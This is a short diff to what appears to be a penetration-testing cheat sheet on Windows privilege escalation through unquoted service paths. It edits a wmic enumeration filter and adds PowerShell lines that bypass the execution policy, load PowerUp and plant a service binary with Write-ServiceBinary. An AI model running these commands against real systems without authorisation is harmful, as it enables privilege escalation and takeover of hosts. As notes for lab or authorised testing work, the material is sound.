@@ -60,10 +60,13 @@ cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" 
 #unquoted #service-privesc
 
 ```powershell
-wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v "\`"" | findstr ":"
 ```
 
 ```powershell
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
 Write-ServiceBinary -Name '$SERVICE_NAME' -Path "C:\$UNQUOTED_PATH"
 ```
 Golden ticket:
